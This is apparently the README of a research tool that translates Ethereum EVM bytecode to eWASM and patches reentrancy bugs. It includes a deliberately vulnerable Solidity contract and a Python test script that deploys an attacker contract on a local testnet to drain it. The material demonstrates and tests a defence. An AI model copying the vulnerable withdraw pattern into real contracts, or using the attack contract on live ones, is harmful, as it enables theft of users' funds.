# EthSema - Ethereum Binary translator for eWASM

EthSema is a novel EVM-to-eWASM bytecode translator that can not only ensure the fidelity of translation but also fix commonly-seen vulnerabilities in smart contracts.It is non-trivial to develop ETHSEMA due to the challenges in lifting EVM bytecode to LLVM IR and handling the Ethereum Environment Interfaces (EEI) and Ethereum Contract Interfaces(ECI). 


## Getting and building the code

Download the pre-compiled binary via this [link](https://github.com/ethsema/ethsema-paper/releases/download/review/standalone-evmtrans)
It works well in Ubuntu 18.04, 20.04.
The source code and the building document will be released after our paper is accepted. Currently, we only public the standalone binary.

# Getting Started

Here is an simple example, which can be exploited by an reentrancy attacker.

```solidity
pragma solidity ^0.8.11;

contract reEntrancy {
  mapping(address => uint256) public balances;

  constructor(uint256 airtoken){
    balances[msg.sender] = airtoken;
  }

  function depositFunds() public payable {
      balances[msg.sender] += msg.value;
  }
  function withdrawFunds (uint256 _weiToWithdraw) public payable {
    require(balances[msg.sender] >= _weiToWithdraw);
    (bool success, ) = msg.sender.call{value: _weiToWithdraw, gas:gasleft()}(abi.encodeWithSignature("any()") );
    require(success);
    unchecked { 
        balances[msg.sender] -= _weiToWithdraw;
    }
    }
}
```



## Translate EVM bytecode to eWASM

- EVM bytecode

  When we are going to deploy the example contract with `uint256 airtoken = 0x10` as the constructor argument, EVM will receive the below code and execute it for deployment.

  ```
  608060405234801561001057600080fd5b506040516105fe3803806105fe833981810160405281019061003291906100b6565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550506100e3565b600080fd5b6000819050919050565b61009381610080565b811461009e57600080fd5b50565b6000815190506100b08161008a565b92915050565b6000602082840312156100cc576100cb61007b565b5b60006100da848285016100a1565b91505092915050565b61050c806100f26000396000f3fe6080604052600436106100345760003560e01c8063155dd5ee1461003957806327e235e314610055578063e2c41dbc14610092575b600080fd5b610053600480360381019061004e91906102de565b61009c565b005b34801561006157600080fd5b5061007c60048036038101906100779190610369565b610234565b60405161008991906103a5565b60405180910390f35b61009a61024c565b005b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410156100e757600080fd5b60003373ffffffffffffffffffffffffffffffffffffffff16825a906040516024016040516020818303038152906040527fe4608b73000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610193919061043a565b600060405180830381858888f193505050503d80600081146101d1576040519150601f19603f3d011682016040523d82523d6000602084013e6101d6565b606091505b50509050806101e457600080fd5b816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505050565b60006020528060005260406000206000915090505481565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461029a9190610480565b92505081905550565b600080fd5b6000819050919050565b6102bb816102a8565b81146102c657600080fd5b50565b6000813590506102d8816102b2565b92915050565b6000602082840312156102f4576102f36102a3565b5b6000610302848285016102c9565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103368261030b565b9050919050565b6103468161032b565b811461035157600080fd5b50565b6000813590506103638161033d565b92915050565b60006020828403121561037f5761037e6102a3565b5b600061038d84828501610354565b91505092915050565b61039f816102a8565b82525050565b60006020820190506103ba6000830184610396565b92915050565b600081519050919050565b600081905092915050565b60005b838110156103f45780820151818401526020810190506103d9565b83811115610403576000848401525b50505050565b6000610414826103c0565b61041e81856103cb565b935061042e8185602086016103d6565b80840191505092915050565b60006104468284610409565b915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061048b826102a8565b9150610496836102a8565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156104cb576104ca610451565b5b82820190509291505056fea2646970667358221220fc6bda953030bf54539da0f84ed06ad8d2414bd20ae6aa42fa61957c091177af64736f6c634300080b00330000000000000000000000000000000000000000000000000000000000000010
  ```

- eWASM generation

  we save the above hex bytecode into `./.tmp.hex` and run EthSema to get eWASM code.

  ```bash
  cat ./.tmp.hex | xxd -r -ps > .tmp.bin && /path/to/standalone-evmtrans /path/to/ewasm/code
  ```

  Also we can fix the reentrancy vulnerability using this cmd.

  ```bash
  cat ./.tmp.hex | xxd -r -ps > .tmp.bin && /path/to/standalone-evmtrans /path/to/ewasm/code --check-reentrancy	
  ```

## eWASM testnet

**geth + Hera**

We build a testnet with a [geth](https://github.com/ewasm/go-ethereum) node (commit-0x6c61eba), which uses [Hera](https://github.com/ewasm/hera) (commit-0xa396507) as the eWASM VM and maintains the compatibility to EVM. 

```bash
$ docker build -t localhost/client-go:ewasm .
$ ./scripts/ewasm.sh
```

**Note:** At this time, we only use default version of Hera and Geth to for this start up. In our paper, we further extended Hera to support all Ethereum interfaces introduced from the latest “London” upgrade [62], such as CREATE2, SELFBALANCE, CHAINID, BASEFEE and COINBASE.  

## Run

![example](https://github.com/ethsema/ethsema/blob/main/example.gif)

The below code is an test script, which use an EVM smart contract to exploit the reentrancy vulnerability in the eWASM code.

Requirement: Python3.8, Solcx, web3py

```python
# author cswmchen
# date   15-11-21
# python -m runtimeTest.reentrancy --overwrite --langArgs="--check-reentrancy"
import argparse
from web3 import Web3
import solcx

victimSol = '''
pragma solidity ^0.8.11;

contract reEntrancy {
  mapping(address => uint256) public balances;

  constructor(uint256 airtoken){
    balances[msg.sender] = airtoken;
  }

  function depositFunds() public payable {
      balances[msg.sender] += msg.value;
  }
  function withdrawFunds (uint256 _weiToWithdraw) public payable {
    require(balances[msg.sender] >= _weiToWithdraw);
    (bool success, ) = msg.sender.call{value: _weiToWithdraw, gas:gasleft()}(abi.encodeWithSignature("any()") );
    require(success);
    unchecked { 
        balances[msg.sender] -= _weiToWithdraw;
    }
    }
}
'''

expAgentSol = '''
contract ReEntrancy {
    mapping(address => uint256) public balances;
    function depositFunds() public payable;    function withdrawFunds (uint256 _weiToWithdraw) public payable;
 }

contract Attack {
  ReEntrancy public instance;
    address public _at;

  // intialise the etherStore variable with the contract address
  constructor(address _instanceAddr) {
      instance = ReEntrancy(_instanceAddr);
      _at = _instanceAddr;
  }
  
  function balanceOf(address account) view public returns (uint256) {
      return instance.balances(account);
  }
  function pay() public payable {
      require(msg.value >= 1 ether);
  }
  function deposit() public payable {
      instance.depositFunds.value(1 ether)();
  }
  
  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      instance.depositFunds.value(1 ether)();
      instance.withdrawFunds(1 ether);
  }
  
  function collectEther() public {
      msg.sender.transfer(this.balance);
  }
    
  function () payable {
      if (instance.balance >= 1 ether) {
          instance.withdrawFunds(1 ether);
      }
  }
}
'''


def runRPC():
    w3 = Web3(Web3.HTTPProvider("http://localhost:8545",
              request_kwargs={'timeout': 60}))
    from web3.middleware import geth_poa_middleware
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    assert w3.isConnected() == True, "[ERROR] Testnet is not activated."
    if len(w3.eth.accounts) < 2:
        w3.geth.personal.new_account("")
    for account in w3.eth.accounts:
        w3.geth.personal.unlock_account(account, "", 99999)
    return w3


def transferEther(w3, _from, _to, _value):
    _tx_hash = w3.eth.sendTransaction(
        {'from': _from, 'to': _to, 'value': _value})
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)


def compile_source_file(source, version='0.4.26'):
    solcx.install_solc(version)
    res = solcx.compile_source(source, output_values=[
                               "abi", "bin", "bin-runtime"], solc_version=version)
    _name = list(res.keys())[0]
    return res[_name]


def evm2ewasm(evmHex, args):
    import os
    with open('.tmp.hex', 'w') as f:
        f.write(evmHex)
    cmd = "cat ./.tmp.hex | xxd -r -ps > .tmp.bin && /home/toor/evmTrans/EVMTrans/build/evmtrans/standalone-evmtrans .tmp.bin -o res.wasm " + \
        args.langArgs + " > /dev/null 2>&1"
    if 0 != os.system(cmd):
        raise Exception("EVMTrans fall.")
    return os.popen(f"xxd -p res.wasm | tr -d $'\n'").read()


def deploy_contract(w3, owner, abi, bytecode, args=""):
    if args != "":
        _tx_hash = w3.eth.contract(abi=abi, bytecode=bytecode).constructor(
            args).transact({'from': owner, 'gas': 300000000000})
    else:
        _tx_hash = w3.eth.contract(abi=abi, bytecode=bytecode).constructor().transact({
            'from': owner, 'gas': 300000000000})
    address = w3.eth.wait_for_transaction_receipt(_tx_hash)['contractAddress']
    return address


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--langArgs", help="arguments for the translator",
                        required=False, type=str, default="")
    args = parser.parse_args()

    w3 = runRPC()
    if w3.eth.get_balance(w3.eth.accounts[1]) < w3.toWei(2, 'ether'):
        transferEther(w3, w3.eth.accounts[0],
                      w3.eth.accounts[1], w3.toWei(2, 'ether'))

    cmrt = compile_source_file(victimSol, version='0.8.11')
    _tx = {'from': w3.eth.accounts[0], 'value': 0, 'gas': 6300000160000, 'data': evm2ewasm(
        cmrt['bin'] + "0000000000000000000000000000000000000000000000000000000000000010", args)}
    receipt = w3.eth.wait_for_transaction_receipt(w3.eth.send_transaction(_tx))
    victimAddr = receipt['contractAddress']
    victim = w3.eth.contract(address=victimAddr, abi=cmrt['abi'])
    print("eWASM contract deployed at ", victimAddr)
    _tx_hash = victim.functions.depositFunds().transact(
        {'from': w3.eth.accounts[0], 'value': w3.toWei(4, 'ether'), 'gas': 100000})
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

    # deploy atkAgent in EVM bytecode
    cmrt = compile_source_file(expAgentSol, version='0.4.26')
    atkAgentAddr = deploy_contract(
        w3, w3.eth.accounts[1], cmrt['abi'], cmrt['bin'], victimAddr)
    atkAgent = w3.eth.contract(address=atkAgentAddr, abi=cmrt['abi'])

    print(f"=========================== initial states ================================")
    print(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    print(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")

    print(f"attacking...\n")
    _tx_hash = atkAgent.functions.pwnEtherStore().transact(
        {'from': w3.eth.accounts[1], 'value': w3.toWei(1, 'ether'), 'gas': 3000000000})
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

    # prtInfo(f"=========================== exploited ================================")
    print(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    print(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")

    assert w3.eth.get_balance(
        victimAddr) == 0, "Fail to steal Ether from the victim"
    print("PASSED")

main()
```



## FAQ

- Do you plan to release the source code? Yes. We will public it, once our acamedic paper is accepted.

## License

[MIT](https://github.com/ethsema/ethsema-paper/blob/main/LICENSE)
